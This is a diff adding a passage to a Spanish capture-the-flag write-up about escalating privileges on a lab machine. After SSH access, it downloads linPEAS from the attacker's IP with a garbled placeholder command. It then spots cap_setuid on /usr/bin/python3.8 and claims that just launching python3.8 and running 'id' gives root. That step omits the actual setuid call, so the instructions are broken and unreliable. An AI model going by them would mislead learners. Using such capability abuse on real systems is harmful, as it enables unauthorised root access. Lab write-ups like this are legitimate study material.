@@ -37,3 +37,17 @@ Vamos a conectarnos via ssh
 Con esto nos conectamos y tenemos facilita la primera flag de usuario.
 
 Ya dentro podemos utilizar el script de linPEAS para aprovechar otros vectores de privilegios. 
+```
+curl nuestra ip por hhtp linpeas.sh
+```
+El reporte que nos da el script contiene datos interesantes la ruta /usr/bin/python3.8 debe tener cap_setuid que esto alude al proceso de ganar privilegios de SUID (root)
+
+si hacemos un 
+```
+/usr/bin/python3.8
+```
+```
+id
+```
+nos daremos cuenta que somos root
+gg
